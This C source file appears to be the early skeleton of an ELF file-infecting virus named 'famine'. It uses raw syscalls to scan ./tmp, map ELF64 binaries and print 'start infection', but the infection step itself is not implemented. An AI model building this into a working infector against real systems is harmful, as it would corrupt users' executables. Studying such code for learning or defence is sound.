#include <elf.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>

#ifndef NULL
#define NULL ((void *)0)
#endif


char newline __attribute__((section(".text"))) = '\n';
extern long _syscall(long number, ...);

// utils
struct linux_dirent64 {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

typedef struct data_s {
	int _fd;
	uint8_t* _map;
	size_t _size;
} data_t;

int	ft_strlen(const char *s)
{
	int i = 0;
	while (s[i])
		i++;
	return (i);
}

void	*ft_memset(void *b, int c, size_t len) {
	uint8_t *ptr = b;
	for (size_t i = 0; i < len; i++) {
		ptr[i] = c;
	}
	return b;
}

void	*ft_memcpy(void *dst, const void *src, size_t size) {
	uint8_t *d = dst;
	uint8_t *s = (uint8_t *)src;

	for (size_t i = 0; i < size; i++) {
		d[i] = s[i];
	}
	return dst;
}

int	ft_memcmp(const void *s1, const void *s2, size_t size) {
	uint8_t *str1 = (uint8_t *)s1;
	uint8_t *str2 = (uint8_t *)s2;

	for (size_t i = 0; i < size; i++) {
		if (str1[i] != str2[i])
			return (str1[i] - str2[i]);
	}
	return (0);
}

void	ft_strcpy(char *dest, const char *src)
{
	int i = 0;
	while (src[i])
	{
		dest[i] = src[i];
		i++;
	}
	dest[i] = '\0';
}

size_t ft_strlcat(char *dst, const char *src, size_t size)
{
	size_t i = 0;
	size_t j = 0;
	size_t len = 0;
	while (dst[i] && i < size)
		i++;
	len = i;
	while (src[j] && i + 1 < size)
	{
		dst[i] = src[j];
		i++;
		j++;
	}
	if (len < size)
		dst[i] = '\0';
	return (len + ft_strlen(src));
}

void	make_path(char *path, const char *dir, const char *file)
{
	char slash[] = "/";
	ft_strcpy(path, dir);
	ft_strlcat(path, slash, 1024);
	ft_strlcat(path, file, 1024);
}

void destroy_data(data_t *data) {

	if (data == NULL)
		return;

	if (data->_map != NULL)
		_syscall(SYS_munmap, data->_map, data->_size);

	data->_map = NULL;

	if (data->_fd != -1)
		_syscall(SYS_close, data->_fd);

	data->_fd = -1;
}
//main 

int	map_file(data_t *data, const char *file)
{

	data->_fd = 0;
	data->_map = NULL;
	data->_size = 0;
	
	data->_fd = _syscall(SYS_open, file, 0);
	if (data->_fd < 0)
		return -1;

	char elf[5] = {0x7f, 'E', 'L', 'F', 0x02};

		char ehdr[5U];

		ft_memset(ehdr, 0, sizeof(ehdr));

		if (_syscall(SYS_read, data->_fd, (long)ehdr, 5U) == -1) {
			return -1;
		}

		if (ft_memcmp(ehdr, elf, 5) != 0) {
			return -1;
		}
	
	struct stat st;
	if (_syscall(SYS_fstat, data->_fd, &st) < 0)
		return -1;
	
	void *map = (void *)_syscall(SYS_mmap, 0, st.st_size, \
			PROT_READ | PROT_WRITE, MAP_PRIVATE, data->_fd, 0);
	if (map == MAP_FAILED)
		return -1;

	data->_map = (uint8_t *)map;
	data->_size = st.st_size;

	return 0;
}

void	infect(const char *filename)
{
	data_t data;
	int ret = 0;

	ft_memset(&data, 0, sizeof(data_t));
	ret = map_file(&data, filename);
	if (ret == 0)
	{
		char msg[] = "start infection\n";
		_syscall(SYS_write, 1, msg, ft_strlen(msg));
	}
	destroy_data(&data);
	
}

void	open_file(char *file)
{
	int fd = _syscall(SYS_open, file, O_RDONLY);
	if (fd < 0)
		return ;

	char buf[PATH_MAX];
	struct linux_dirent64 *dir;
	ssize_t ret;

	for(;;)
	{
		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (size_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (struct linux_dirent64 *)(buf + i);

			if (dir->d_name[0] == '.')
				continue;
			
			if (dir->d_type == DT_REG) {
				char new_path[PATH_MAX];
				make_path(new_path, file, dir->d_name);
				infect(new_path);
			}
		}
	}

	_syscall(SYS_close, fd);

}

void	famine(void)
{
	//test _sycall failure

	char p1[] = "./tmp";
	char *paths[] = {
		p1,
		(void *)0,
	};

	for (int i = 0; paths[i]; i++)
		open_file(paths[i]);
}
